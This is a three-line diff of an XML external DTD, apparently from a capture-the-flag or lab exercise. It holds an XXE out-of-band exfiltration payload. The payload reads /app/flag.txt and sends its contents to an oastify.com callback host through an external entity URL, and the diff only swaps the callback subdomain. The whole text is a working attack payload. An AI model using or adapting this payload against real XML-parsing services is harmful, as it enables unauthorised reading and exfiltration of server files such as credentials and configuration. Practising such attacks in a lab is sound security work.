@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "file:///app/flag.txt">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://2orsdh2shp336ejn208sooghf8lz9xxm.oastify.com?flag=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://8eny3nsy7vt9wk9ts6yyeu6n5eb5z4nt.oastify.com?flag=%file;'>">
 %all;
